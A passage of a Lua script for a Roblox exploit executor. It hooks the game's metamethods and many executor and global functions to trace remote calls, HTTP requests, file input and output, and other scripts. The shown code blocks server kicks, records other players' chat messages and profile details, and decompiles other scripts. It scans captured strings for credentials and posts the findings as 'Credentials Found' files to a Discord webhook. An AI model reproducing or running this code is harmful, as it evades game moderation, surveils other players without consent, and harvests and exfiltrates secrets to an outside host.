-- FEATURE 21: SIG OF THE DAY
-- ============================================================
local function install_sig_of_day()
    if not CONFIG.sig_of_day then return end
    task.spawn(function()
        task.wait(5)
        pcall(function()
            if not getscripts then return end
            local names={}
            for _,scr in ipairs(getscripts()) do names[#names+1]=scr.Name end
            table.sort(names)
            local h=simple_hash(table.concat(names,"|"))
            raw_push("sigofday",{op="hash",hash=h,script_count=#names})
        end)
    end)
end

-- ============================================================
-- FEATURE 23: SUSPEND GUARD
-- ============================================================
local function install_suspend_guard()
    if not CONFIG.suspend_guard then return end
    local old_cancel=task.cancel
    if type(old_cancel)=="function" then
        task.cancel=newcclosure(function(thread,...)
            local ok,t=tostring(thread),"?"
            if ok then t=tostring(thread) end
            raw_push("suspend",{op="task_cancel",target=t})
            return old_cancel(thread,...)
        end)
    end
end

-- ============================================================
-- FEATURE 7: C API CALL TRACER
-- ============================================================
local function install_c_api_tracer()
    if not CONFIG.c_api_trace then return end
    if not (CAP.hookmetamethod and CAP.getrawmetatable) then return end
    -- best-effort: hook __namecall already captures most C-bound calls
end

-- ============================================================
-- FEATURE 24: LOCALE CONFUSABLE SCAN
-- ============================================================
local function scan_confusable(s,ctx)
    if not CONFIG.locale_detect then return end
    if type(s)~="string" or #s<4 then return end
    if has_confusable(s) then
        raw_push("confusable",{op="detected",value=s:sub(1,120),src=ctx.src or "?"})
    end
end

-- ============================================================
-- SECRET WRITE (integrated with all trackers)
-- ============================================================
local function attach_caller_source(rec)
    if not CONFIG.decompile_on_critical then return end
    if not (decompile and getscripts and rec.src) then return end
    local target=nil
    for _,scr in ipairs(getscripts()) do if scr.Name==rec.src then target=scr; break end end
    if not target then return end
    local ok,src=pcall(decompile,target)
    if ok and src and type(src)=="string" then
        if #src>CONFIG.decompile_max_bytes then src=src:sub(1,CONFIG.decompile_max_bytes).."\n-- [truncated]" end
        rec.decompiled=src
    end
end

local function secret_write(pattern,value,ctx,kind)
    if in_reentry() then return end
    if not CONFIG.secret_enabled then return end
    if CONFIG.secret_dedupe then
        local key=pattern.name.."|"..value
        if SECRETS.seen[key] then return end
        SECRETS.seen[key]=true
    end
    SECRETS.hits=SECRETS.hits+1
    cred_times[#cred_times+1]=mono()
    if #cred_times>32 then table.remove(cred_times,1) end
    timing_check()

    local real_value=value
    if should_decoy(pattern.name) then
        real_value=decoy_value(pattern.name)
        raw_push("decoy",{op="injected",pattern=pattern.name})
    end

    local rec={pattern=pattern.name,sev=pattern.sev,value=value,
        src=ctx.src or "?",line=ctx.line or 0,fn=ctx.fn or "?",
        kind=kind or ctx.kind or "?",session=SESSION_ID}

    if rec.sev=="CRIT" then
        pcall(attach_caller_source,rec)
        regex_snapshot(pattern.name)
    end

    if creds_handle then
        pcall(function()
            creds_handle:write(string.format("[%s] %s :: %s  <- %s:%d\n",pattern.sev,pattern.name,value,rec.src,rec.line))
            creds_handle:flush()
        end)
    end
    track_lineage(pattern.name,value,rec.src)
    creds_queue[#creds_queue+1]=rec
    raw_push("secret",rec)
    score_event("secret",pattern.sev)
    return real_value
end

local function scan_string(s,ctx)
    if type(s)~="string" or #s<8 then return end
    for _,p in ipairs(PATTERNS) do
        local ok,m=pcall(string.match,s,p.re)
        if ok and m then
            local found=type(m)=="string" and m or s
            secret_write(p,found,ctx,ctx.kind)
        end
    end
    if #s>=CONFIG.secret_min_b64_len and s:match("^[A-Za-z0-9+/=]+$") then
        secret_write({name="base64_blob",sev="LOW"},s:sub(1,96).."...",ctx,ctx.kind)
    end
    if #s>=CONFIG.secret_min_hex_len and s:match("^[0-9a-fA-F]+$") then
        secret_write({name="hex_blob",sev="LOW"},s:sub(1,96).."...",ctx,ctx.kind)
    end
    scan_confusable(s,ctx)
end

local function scan_table(t,ctx,depth)
    if depth>4 then return end
    if type(t)~="table" then return end
    for k,v in pairs(t) do
        if type(k)=="string" then scan_string(k,ctx) end
        if type(v)=="string" then scan_string(v,ctx) end
        if type(v)=="table" then scan_table(v,ctx,depth+1) end
    end
end

local function scan_value(v,ctx,depth)
    depth=depth or 0
    local t=type(v)
    if t=="string" then scan_string(v,ctx)
    elseif t=="table" then scan_table(v,ctx,depth) end
end

-- ============================================================
-- AUTO-TAINT (feature 6)
-- ============================================================
local function autotaint_string(s,tag)
    if not CONFIG.autotaint then return end
    if type(s)~="string" or #s<8 then return end
    if taint_string_count>=CONFIG.taint_strings_max then
        for k in pairs(taint_strings) do taint_strings[k]=nil; taint_string_count=taint_string_count-1; break end
    end
    taint_strings[s]=tag or true
    taint_string_count=taint_string_count+1
end
local function is_tainted_string(s)
    return taint_strings[s] or false
end

-- ============================================================
-- FILE OUTPUT BUILDERS
-- ============================================================
local function build_creds_file(batch)
    local lines={}
    lines[#lines+1]="Credentials Founds"
    lines[#lines+1]="Author: NevaHex"
    lines[#lines+1]="Session: "..SESSION_ID
    lines[#lines+1]="Generated: "..os.date("%Y-%m-%dT%H:%M:%SZ")
    lines[#lines+1]="Total: "..tostring(#batch)
    lines[#lines+1]=""
    for i,s in ipairs(batch) do
        lines[#lines+1]=string.format("[%d] severity=%s pattern=%s",i,s.sev or "?",s.pattern or "?")
        lines[#lines+1]="    value="..(s.value or "?")
        lines[#lines+1]=string.format("    src=%s:%d",s.src or "?",s.line or 0)
        lines[#lines+1]="    fn="..(s.fn or "?")
        lines[#lines+1]="    kind="..(s.kind or "?")
        if s.decompiled then
            lines[#lines+1]="    decompiled:"
            lines[#lines+1]=s.decompiled
        end
        lines[#lines+1]=""
    end
    return table.concat(lines,"\n")
end

local function build_envlog_file(batch)
    local lines={}
    lines[#lines+1]="Environment Logged"
    lines[#lines+1]="Author: NevaHex"
    lines[#lines+1]="Session: "..SESSION_ID
    lines[#lines+1]="Generated: "..os.date("%Y-%m-%dT%H:%M:%SZ")
    lines[#lines+1]="Total: "..tostring(#batch)
    lines[#lines+1]=""
    for i,s in ipairs(batch) do
        lines[#lines+1]=string.format("[%d] kind=%s",i,s.kind or "?")
        if s.payload then
            for k,v in pairs(s.payload) do
                lines[#lines+1]=string.format("    %s=%s",tostring(k),tostring(v))
            end
        end
        lines[#lines+1]=""
    end
    return table.concat(lines,"\n")
end

local function send_creds_file(batch)
    if #batch==0 then return false,"empty" end
    local worst=worst_sev(batch)
    local summary=count_patterns(batch)
    local ts=os.date("!%Y-%m-%dT%H:%M:%SZ")
    local desc=string.format("Captured %d credential(s). Details in attached %s.",#batch,CREDS_FILENAME_DISCORD)
    local payload=string.format(
        '{"embeds":[{"title":"Credentials Found","color":%d,"description":"%s","fields":[{"name":"Count","value":"%d","inline":true},{"name":"Highest Severity","value":"%s","inline":true},{"name":"Top Patterns","value":"%s","inline":false},{"name":"Session","value":"%s","inline":true}],"footer":{"text":"%s"},"timestamp":"%s"}]}',
        EMBED_COLOR,json_escape(desc),#batch,json_escape(worst),json_escape(summary),
        json_escape(SESSION_ID),json_escape(CUSTOM_FOOTER),ts)
    return post_multipart_file(payload,CREDS_FILENAME_DISCORD,build_creds_file(batch))
end

local function send_envlog_file(batch)
    if #batch==0 then return false,"empty" end
    local ts=os.date("!%Y-%m-%dT%H:%M:%SZ")
    local desc=string.format("Captured %d environment event(s). Details in attached %s.",#batch,ENVLOG_FILENAME_DISCORD)
    local payload=string.format(
        '{"embeds":[{"title":"Environment Log","color":%d,"description":"%s","fields":[{"name":"Count","value":"%d","inline":true},{"name":"Session","value":"%s","inline":true}],"footer":{"text":"%s"},"timestamp":"%s"}]}',
        EMBED_COLOR,json_escape(desc),#batch,json_escape(SESSION_ID),
        json_escape(CUSTOM_FOOTER),ts)
    return post_multipart_file(payload,ENVLOG_FILENAME_DISCORD,build_envlog_file(batch))
end

local function send_embed(title,fields,description,color)
    local field_json={}
    for _,f in ipairs(fields or {}) do
        field_json[#field_json+1]=string.format('{"name":"%s","value":"%s","inline":%s}',
            json_escape(f.name or "?"),
            json_escape(tostring(f.value or "?"):sub(1,1024)),
            f.inline and "true" or "false")
    end
    local desc=description and string.format(',"description":"%s"',json_escape(description:sub(1,4000))) or ""
    local body=string.format(
        '{"embeds":[{"title":"%s","color":%d%s,"fields":[%s],"footer":{"text":"%s"},"timestamp":"%s"}]}',
        json_escape(title or "event"),color or EMBED_COLOR,desc,
        table.concat(field_json,","),json_escape(CUSTOM_FOOTER),os.date("!%Y-%m-%dT%H:%M:%SZ"))
    return post_json_with_retry(body)
end

-- ============================================================
-- ENVLOG WRITE + ROTATE
-- ============================================================
local function rotate_envlog_if_needed()
    if not envlog_handle or not envlog_bytes then return end
    if envlog_bytes<CONFIG.envlog_rotate_bytes then return end
    pcall(function() envlog_handle:close() end)
    pcall(os.rename,CONFIG.envlog_path,CONFIG.envlog_path..".1")
    open_envlog()
end

local function write_envlog_line(kind,data)
    if not envlog_handle then return end
    local parts={string.format("[%.3f #%d] %s",mono(),next_seq(),kind)}
    for k,v in pairs(data) do
        if type(v)=="string" then parts[#parts+1]=k.."="..v
        elseif type(v)=="number" then parts[#parts+1]=k.."="..tostring(v)
        elseif type(v)=="table" then
            local sub={}
            for kk,vv in pairs(v) do sub[#sub+1]=tostring(kk)..":"..tostring(vv) end
            parts[#parts+1]=k.."={"..table.concat(sub,",").."}"
        end
    end
    local line=table.concat(parts," | ").."\n"
    pcall(function() envlog_handle:write(line); envlog_handle:flush() end)
    envlog_bytes=(envlog_bytes or 0)+#line
    rotate_envlog_if_needed()
end

local function flush_creds_queue()
    if #creds_queue==0 then return end
    local now=mono()
    if now-last_creds_send<CONFIG.webhook_min_gap then return end
    last_creds_send=now
    local batch=creds_queue; creds_queue={}
    local lines={"Credentials Founds:"}
    for _,s in ipairs(batch) do
        lines[#lines+1]=string.format("%s | %s | %s:%d",s.pattern or "?",s.value or "?",s.src or "?",s.line or 0)
    end
    print(table.concat(lines,"\n"))
    local ok,err=send_creds_file(batch)
    if ok then print("Webhooks Successfully Sent!")
    else print("Webhook failed: "..tostring(err)) end
end

local function flush_envlog_queue(force)
    if #envlog_queue==0 then return end
    local now=mono()
    if not force and now-last_envlog_send<CONFIG.envlog_send_gap then return end
    last_envlog_send=now
    local batch=envlog_queue; envlog_queue={}
    send_envlog_file(batch)
end

-- ============================================================
-- SIGNATURES
-- ============================================================
local signatures={
    {rule="loadstring-large",severity="HIGH",match=function(k,d) return k=="load" and d.op=="loadstring" and (d.size or 0)>400 end},
    {rule="http-exfil",severity="HIGH",match=function(k,d) if k~="http" then return false end local n=tostring(d.op or ""):lower(); return n:find("post") or n:find("request") end},
    {rule="remote-flood",severity="MED",match=function(k,d) if k~="remote" then return false end local b=rate_buckets[(d.src or "?").."|"..tostring(d.method)]; return b and b.n and b.n>25 end},
    {rule="getfenv-escape",severity="MED",match=function(k,d) return k=="env" and d.op and d.op:find("getfenv",1,true)~=nil end},
    {rule="metatable-write",severity="MED",match=function(k,d) if k~="write" then return false end local ks=tostring(d.key); return ks=="__index" or ks=="__newindex" or ks=="__namecall" end},
    {rule="rawset-on-game",severity="MED",match=function(k,d) return k=="raw" and d.op=="rawset" and d.target==game end},
    {rule="file-write",severity="MED",match=function(k,d) return k=="file" and d.op=="writefile" end},
    {rule="player-kick",severity="HIGH",match=function(k,d) return k=="player" and d.op=="Kick" end},
    {rule="humanoid-speed",severity="MED",match=function(k,d) if k~="humanoid" then return false end return d.key=="WalkSpeed" or d.key=="JumpPower" or d.key=="JumpHeight" end},
    {rule="secret-detected",severity="CRIT",match=function(k,d) return k=="secret" and d.sev=="CRIT" end},
    {rule="known-bad-script",severity="HIGH",match=function(k,d) return k=="known_bad" end},
    {rule="remote-schema-anomaly",severity="MED",match=function(k,d) return k=="schema" end},
    {rule="shared-cred-lineage",severity="HIGH",match=function(k,d) return k=="lineage" end},
    {rule="automated-exfil",severity="HIGH",match=function(k,d) return k=="timing" end},
    {rule="confusable-unicode",severity="MED",match=function(k,d) return k=="confusable" end},
}

local function run_signatures(kind,data)
    if not CONFIG.trace_signatures then return end
    for _,sig in ipairs(signatures) do
        local ok,hit=pcall(sig.match,kind,data)
        if ok and hit then
            raw_push("sig",{rule=sig.rule,severity=sig.severity,src=data.src or "?",line=data.line or 0,fn=data.fn or "?",origin_kind=kind})
        end
    end
end

-- ============================================================
-- LOG_EVENT
-- ============================================================
local function log_event(kind,data)
    if not in_reentry() and CONFIG.secret_enabled and CONFIG.secret_scan_kinds[kind] then
        local ctx={kind=kind,src=data.src or "?",line=data.line or 0,fn=data.fn or "?"}
        for k,v in pairs(data) do
            if k=="frames" then
                for _,f in ipairs(v) do scan_string(f.src or "",ctx) end
            elseif type(v)=="string" then scan_string(v,ctx)
            elseif type(v)=="table" then scan_table(v,ctx,0) end
        end
    end
    push(kind,data)
    if kind~="secret" then
        write_envlog_line(kind,data)
        envlog_queue[#envlog_queue+1]={kind=kind,payload=data,t=mono()}
        if #envlog_queue>=CONFIG.envlog_batch_max then flush_envlog_queue(true) end
    end
    run_signatures(kind,data)
end

local function flush()
    flush_creds_queue()
    flush_envlog_queue(false)
end

-- ============================================================
-- HOOKS
-- ============================================================
local hook_registry={}

local function install_metahooks()
    local gm=getrawmetatable and getrawmetatable(game)
    if not gm then return end
    local old_index=gm.__index
    local old_newindex=gm.__newindex
    local old_namecall=gm.__namecall
    local was_ro=isreadonly and isreadonly(gm) or false
    if setreadonly then pcall(setreadonly,gm,false) end

    if CONFIG.trace_reads and old_index then
        gm.__index=newcclosure(function(self,key)
            if in_reentry() then return old_index(self,key) end
            entering()
            local src,line,fn,frames=caller_info(2)
            local ok,val=pcall(old_index,self,key)
            leaving()
            if ok then log_event("read",{target=self,key=key,value=val,src=src,line=line,fn=fn,frames=frames}) end
            if not ok then return old_index(self,key) end
            return val
        end)
        hook_registry["gm.__index"]=gm.__index
    end

    if CONFIG.trace_writes and old_newindex then
        gm.__newindex=newcclosure(function(self,key,value)
            if in_reentry() then return old_newindex(self,key,value) end
            entering()
            local src,line,fn,frames=caller_info(2)
            leaving()
            log_event("write",{target=self,key=key,value=value,src=src,line=line,fn=fn,frames=frames})
            return old_newindex(self,key,value)
        end)
        hook_registry["gm.__newindex"]=gm.__newindex
    end

    if old_namecall then
        gm.__namecall=newcclosure(function(self,...)
            if in_reentry() then return old_namecall(self,...) end
            local method=getnamecallmethod and getnamecallmethod() or "?"
            local src,line,fn,frames=caller_info(2)
            local args=table.pack(...)

            if CONFIG.anti_kick and method=="Kick" then
                log_event("player",{op="Kick-BLOCKED",target=self,args=args,src=src,line=line,fn=fn,frames=frames})
                return nil
            end

            local is_remote=method=="FireServer" or method=="InvokeServer" or method=="Fire" or method=="Invoke"
            local is_signal=method=="Connect" or method=="Once" or method=="Wait" or method=="ConnectParallel"
            local is_player=method=="LoadCharacter" or method=="MoveTo" or method=="TakeDamage"
            local is_chat=method=="SayMessageRequest" or method=="Chat" or method=="SendAsync"
            local is_humanoid=method=="Move" or method=="ChangeState"

            if CONFIG.trace_remote and is_remote then
                local class="?"
                entering(); pcall(function() class=self.ClassName end); leaving()
                local attrib
                if CONFIG.script_attribution and getcallingscript then
                    entering(); pcall(function() attrib=getcallingscript() end); leaving()
                    if attrib and attrib.Name then attrib=attrib.Name end
                end
                learn_remote(self,method,args)
                for i=1,args.n do if type(args[i])=="string" then autotaint_string(args[i],"remote_out") end end
                log_event("remote",{class=class,method=method,args=args,target=self,attrib=attrib,src=src,line=line,fn=fn,frames=frames})
            end
            if CONFIG.trace_signals and is_signal then log_event("signal",{op=method,target=self,src=src,line=line,fn=fn,frames=frames}) end
            if CONFIG.trace_player and is_player then log_event("player",{op=method,target=self,args=args,src=src,line=line,fn=fn,frames=frames}) end
            if CONFIG.trace_chat and is_chat then
                local msg=args[1] or (args[2] and tostring(args[2])) or ""
                log_event("chat",{op=method,message=msg,target=self,src=src,line=line,fn=fn,frames=frames})
            end
            if CONFIG.trace_humanoid and is_humanoid then log_event("humanoid",{op=method,target=self,args=args,src=src,line=line,fn=fn,frames=frames}) end
            if CONFIG.trace_calls and not is_remote and not is_signal and not is_player and not is_chat and not is_humanoid then
                log_event("call",{target=self,method=method,args=args,src=src,line=line,fn=fn,frames=frames})
            end

            entering()
            local ok,a,b,c,d,e=pcall(old_namecall,self,...)
            leaving()
            if not ok then return old_namecall(self,...) end
            return a,b,c,d,e
        end)
        hook_registry["gm.__namecall"]=gm.__namecall
    end
    if setreadonly then pcall(setreadonly,gm,was_ro) end
end

local function install_global_hooks()
    local env=getgenv and getgenv() or _G

    if CONFIG.trace_env then
        local old_setfenv=env.setfenv or setfenv
        if old_setfenv then env.setfenv=newcclosure(function(f,t)
            if in_reentry() then return old_setfenv(f,t) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("env",{op="setfenv(f,"..fmt_val(t,1)..")",src=s,line=l,fn=n,frames=fr})
            return old_setfenv(f,t)
        end) end
        local old_getfenv=env.getfenv or getfenv
        if old_getfenv then env.getfenv=newcclosure(function(f)
            if in_reentry() then return old_getfenv(f) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("env",{op="getfenv("..fmt_val(f,1)..")",src=s,line=l,fn=n,frames=fr})
            return old_getfenv(f)
        end) end
        if getsenv then
            local old_getsenv=getsenv
            env.getsenv=newcclosure(function(scr)
                if in_reentry() then return old_getsenv(scr) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("env",{op="getsenv("..fmt_ident(scr)..")",src=s,line=l,fn=n,frames=fr})
                return old_getsenv(scr)
            end)
        end
    end

    if CONFIG.trace_load then
        local old_ls=env.loadstring or loadstring
        if old_ls then env.loadstring=newcclosure(function(src,chunk)
            if in_reentry() then return old_ls(src,chunk) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            load_counts.manual=load_counts.manual+1
            if type(src)=="string" then scan_string(src,{kind="loadstring",src=s,line=l,fn=n}) end
            log_event("load",{op="loadstring",size=type(src)=="string" and #src or 0,content=type(src)=="string" and src or nil,src=s,line=l,fn=n,frames=fr})
            return old_ls(src,chunk)
        end) end
        local old_load=env.load or load
        if old_load then env.load=newcclosure(function(chunk,name,mode,e)
            if in_reentry() then return old_load(chunk,name,mode,e) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            load_counts.manual=load_counts.manual+1
            if type(chunk)=="string" then scan_string(chunk,{kind="load",src=s,line=l,fn=n}) end
            log_event("load",{op="load",size=type(chunk)=="string" and #chunk or 0,src=s,line=l,fn=n,frames=fr})
            return old_load(chunk,name,mode,e)
        end) end
    end

    if CONFIG.trace_require then
        local old_req=env.require or require
        if old_req then env.require=newcclosure(function(target)
            if in_reentry() then return old_req(target) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("require",{target=target,src=s,line=l,fn=n,frames=fr})
            return old_req(target)
        end) end
    end

    if CONFIG.trace_rawnet then
        local old_rawset,old_rawget=rawset,rawget
        if old_rawset then env.rawset=newcclosure(function(t,k,v)
            if in_reentry() then return old_rawset(t,k,v) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("raw",{op="rawset",target=t,key=k,value=v,src=s,line=l,fn=n,frames=fr})
            return old_rawset(t,k,v)
        end) end
        if old_rawget then env.rawget=newcclosure(function(t,k)
            if in_reentry() then return old_rawget(t,k) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("raw",{op="rawget",target=t,key=k,value="?",src=s,line=l,fn=n,frames=fr})
            return old_rawget(t,k)
        end) end
    end

    if CONFIG.trace_instance and env.Instance and env.Instance.new then
        local old_new=env.Instance.new
        local mt=getmetatable(env.Instance) or {}
        local real_index=mt.__index
        env.Instance=setmetatable({
            new=newcclosure(function(class,parent)
                if in_reentry() then return old_new(class,parent) end
                entering(); local s,l,n,fr=caller_info(2)
                local result=old_new(class,parent)
                leaving()
                ancestry_hash(result)
                log_event("instance",{class=class,result=result,src=s,line=l,fn=n,frames=fr})
                return result
            end),
        },{__index=function(_,k) if k=="new" then return nil end if real_index then return real_index(env.Instance,k) end return nil end})
    end

    if CONFIG.auto_attribute_spy then
        local old_sa,old_ga,old_sas=env.setattribute,env.getattribute,env.setattributes
        if old_sa then env.setattribute=newcclosure(function(inst,name,value)
            if in_reentry() then return old_sa(inst,name,value) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("attribute",{op="setattribute",target=tostring(inst),name=tostring(name),value=tostring(value),src=s,line=l,fn=n,frames=fr})
            return old_sa(inst,name,value)
        end) end
        if old_ga then env.getattribute=newcclosure(function(inst,name)
            if in_reentry() then return old_ga(inst,name) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("attribute",{op="getattribute",target=tostring(inst),name=tostring(name),src=s,line=l,fn=n,frames=fr})
            return old_ga(inst,name)
        end) end
    end

    if CONFIG.auto_clipboard_spy then
        local old_sc=env.setclipboard
        if old_sc then env.setclipboard=newcclosure(function(text)
            if in_reentry() then return old_sc(text) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("clipboard",{op="setclipboard",size=type(text)=="string" and #text or 0,src=s,line=l,fn=n,frames=fr})
            return old_sc(text)
        end) end
    end

    if CONFIG.auto_teleport_queue_spy then
        local old_q=env.queue_on_teleport
        if old_q then env.queue_on_teleport=newcclosure(function(code)
            if in_reentry() then return old_q(code) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("teleport_queue",{op="queue_on_teleport",size=type(code)=="string" and #code or 0,preview=type(code)=="string" and code:sub(1,120) or "?",src=s,line=l,fn=n,frames=fr})
            return old_q(code)
        end) end
    end

    if CONFIG.auto_custom_asset_spy then
        local old_ca=env.getcustomasset
        if old_ca then env.getcustomasset=newcclosure(function(path)
            if in_reentry() then return old_ca(path) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("custom_asset",{op="getcustomasset",path=tostring(path),src=s,line=l,fn=n,frames=fr})
            return old_ca(path)
        end) end
    end
end

local function install_coroutine_hooks()
    if not CONFIG.trace_coroutine then return end
    local co=coroutine
    for _,name in ipairs({"create","resume","yield","wrap","close","status","running","isyieldable"}) do
        local old=co[name]
        if type(old)=="function" then
            co[name]=newcclosure(function(...)
                if in_reentry() then return old(...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("coroutine",{op=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
                return old(...)
            end)
        end
    end
end

local function install_task_hooks()
    if not CONFIG.trace_task then return end
    for _,name in ipairs({"spawn","defer","delay","wait","cancel","synchronize"}) do
        local old=task[name]
        if type(old)=="function" then
            task[name]=newcclosure(function(...)
                if in_reentry() then return old(...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("task",{op=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
                return old(...)
            end)
        end
    end
end

local function install_http_hooks()
    if not CONFIG.trace_http then return end
    local env=getgenv and getgenv() or _G
    local targets={{tbl=env,name="request"},{tbl=env,name="http_request"},{tbl=env,name="HttpGet"},{tbl=env,name="HttpPost"},{tbl=env.syn,name="request"}}
    for _,t in ipairs(targets) do
        if t.tbl and type(t.tbl[t.name])=="function" then
            local old=t.tbl[t.name]
            t.tbl[t.name]=newcclosure(function(opts,...)
                if in_reentry() then return old(opts,...) end
                entering()
                local s,l,n,fr=caller_info(2)
                local url,method,body
                if type(opts)=="table" then url=opts.Url or opts.url; method=opts.Method or opts.method; body=opts.Body or opts.body
                else url=tostring(opts) end
                leaving()
                fingerprint_http(url,body,{src=s,line=l,fn=n})
                log_event("http",{op=t.name,url=url,method=method,opts=type(opts)=="table" and opts or nil,src=s,line=l,fn=n,frames=fr})
                if body then scan_decoded(tostring(body),{kind="http_decoded",src=s,line=l,fn=n}) end
                if body then autotaint_string(tostring(body),"http_body") end
                return old(opts,...)
            end)
        end
    end
end

local function install_file_hooks()
    if not CONFIG.trace_file_io then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"readfile","writefile","appendfile","listfiles","delfile","isfile","isfolder","makefolder"}) do
        local old=env[name]
        if type(old)=="function" then
            env[name]=newcclosure(function(path,...)
                if in_reentry() then return old(path,...) end
                entering()
                local s,l,n,fr=caller_info(2)
                local content
                if name=="writefile" or name=="appendfile" then content=select(1,...) end
                leaving()
                if type(content)=="string" then
                    autotaint_string(content,"file_write")
                    scan_string(content,{kind="file_content",src=s,line=l,fn=n})
                end
                log_event("file",{op=name,path=tostring(path),content=type(content)=="string" and content or nil,src=s,line=l,fn=n,frames=fr})
                return old(path,...)
            end)
        end
    end
end

local function install_debug_hooks()
    if not CONFIG.trace_debug then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"getgc","getreg","getinstances","getnilinstances","getloadedmodules","getscripts","getcallingscript","getscriptbytecode","decompile","dump_function"}) do
        local old=env[name]
        if type(old)=="function" then
            env[name]=newcclosure(function(...)
                if in_reentry() then return old(...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("debug",{op=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
                return old(...)
            end)
        end
    end
end

local function install_closure_hooks()
    if not CONFIG.trace_closure then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"hookfunction","restorefunction","clonefunction","newcclosure","checkcaller"}) do
        local old=env[name]
        if type(old)=="function" then
            env[name]=newcclosure(function(...)
                if in_reentry() then return old(...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                local a=table.pack(...)
                if name=="hookfunction" and type(a[1])=="function" then
                    local chain=upvalue_chain(a[1])
                    local ins=instruction_summary(a[1])
                    log_event("closure",{op=name,target=a[1],chain=chain and #chain or 0,instr=ins and (ins.proto_count or 0) or 0,src=s,line=l,fn=n,frames=fr})
                else
                    log_event("closure",{op=name,target=a[1],src=s,line=l,fn=n,frames=fr})
                end
                return old(...)
            end)
        end
    end
end

local function install_player_hooks()
    if not CONFIG.player_tracking then return end
    pcall(function()
        local Players=game:GetService("Players")
        Players.PlayerAdded:Connect(function(plr)
            if in_reentry() then return end
            entering()
            local name,disp,uid,age,mem=plr.Name,plr.DisplayName,plr.UserId,plr.AccountAge,tostring(plr.MembershipType)
            leaving()
            log_event("player",{op="Joined",target=name,args=table.pack(name,disp,uid,age,mem),src="PlayerAdded",line=0,fn="connect"})
        end)
        Players.PlayerRemoving:Connect(function(plr)
            if in_reentry() then return end
            entering()
            local name,uid=plr.Name,plr.UserId
            leaving()
            log_event("player",{op="Left",target=name,args=table.pack(name,uid),src="PlayerRemoving",line=0,fn="connect"})
        end)
    end)
end

local function install_chat_hooks()
    if not CONFIG.chat_capture then return end
    pcall(function()
        local TCS=game:GetService("TextChatService")
        if TCS and TCS.OnIncomingMessage then
            TCS.OnIncomingMessage=(function(old) return function(msg)
                if not in_reentry() and msg then
                    entering()
                    local txt=msg.Text or "?"
                    local src=msg.TextSource and msg.TextSource.Name or "?"
                    leaving()
                    log_event("chat",{op="incoming",message=txt,from=src,src="TextChatService",line=0,fn="OnIncomingMessage"})
                end
                if old then return old(msg) end
            end end)(TCS.OnIncomingMessage)
        end
        if TCS and TCS.TextChannels then
            for _,ch in ipairs(TCS.TextChannels:GetChildren()) do
                pcall(function()
                    ch.MessageReceived:Connect(function(msg)
                        if in_reentry() then return end
                        entering()
                        local txt=msg.Text or "?"
                        local src=msg.TextSource and msg.TextSource.Name or "?"
                        leaving()
                        log_event("chat",{op="received",message=txt,from=src,src="TextChannel",line=0,fn="MessageReceived"})
                    end)
                end)
            end
        end
    end)
end

local function install_character_hooks()
    if not CONFIG.auto_character_hooks then return end
    local function hook_char(char)
        if not char then return end
        pcall(function()
            char.ChildAdded:Connect(function(c) log_event("character",{op="child_added",class=c.ClassName,name=c.Name,src="Character",line=0,fn="connect"}) end)
            char.ChildRemoved:Connect(function(c) log_event("character",{op="child_removed",class=c.ClassName,name=c.Name,src="Character",line=0,fn="connect"}) end)
            local hum=char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Died:Connect(function() log_event("character",{op="Died",name=char.Name,src="Humanoid",line=0,fn="Died"}) end)
                hum.HealthChanged:Connect(function(h) log_event("character",{op="HealthChanged",health=h,src="Humanoid",line=0,fn="HealthChanged"}) end)
                hum.StateChanged:Connect(function(_,new) log_event("character",{op="StateChanged",state=tostring(new),src="Humanoid",line=0,fn="StateChanged"}) end)
                for _,prop in ipairs({"WalkSpeed","JumpPower","JumpHeight","HipHeight"}) do
                    hum:GetPropertyChangedSignal(prop):Connect(function()
                        log_event("humanoid",{op=prop,value=hum[prop],target=char.Name,src="Humanoid",line=0,fn="prop"})
                    end)
                end
            end
        end)
    end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer
        if plr then
            if plr.Character then hook_char(plr.Character) end
            plr.CharacterAdded:Connect(hook_char)
        end
    end)
end

local function install_descendant_gui_spy()
    if not (CONFIG.auto_descendant_spy or CONFIG.auto_gui_detector) then return end
    local GUI_CLASSES={ScreenGui=true,BillboardGui=true,SurfaceGui=true,TextLabel=true,TextButton=true,TextBox=true,ImageLabel=true,ImageButton=true,Frame=true,ScrollingFrame=true,ViewportFrame=true}
    pcall(function()
        game.DescendantAdded:Connect(function(inst)
            if in_reentry() then return end
            local class=inst.ClassName
            if CONFIG.auto_gui_detector and GUI_CLASSES[class] then
                entering()
                local parent=inst.Parent and inst.Parent:GetFullName() or "?"
                leaving()
                log_event("gui",{op="added",class=class,name=inst.Name,parent=parent,src="DescendantAdded",line=0,fn="connect"})
                return
            end
            if CONFIG.auto_descendant_spy and not CONFIG.descendant_ignore_classes[class] then
                local filter=CONFIG.descendant_class_filter
                if not filter or class==filter then
                    entering()
                    local parent=inst.Parent and inst.Parent:GetFullName() or "?"
                    local src
                    if getcallingscript then local ok,s=pcall(getcallingscript); if ok and s and s.Name then src=s.Name end end
                    leaving()
                    log_event("descendant",{op="added",class=class,name=inst.Name,parent=parent,src=src or "DescendantAdded",line=0,fn="connect"})
                end
            end
        end)
        game.DescendantRemoving:Connect(function(inst)
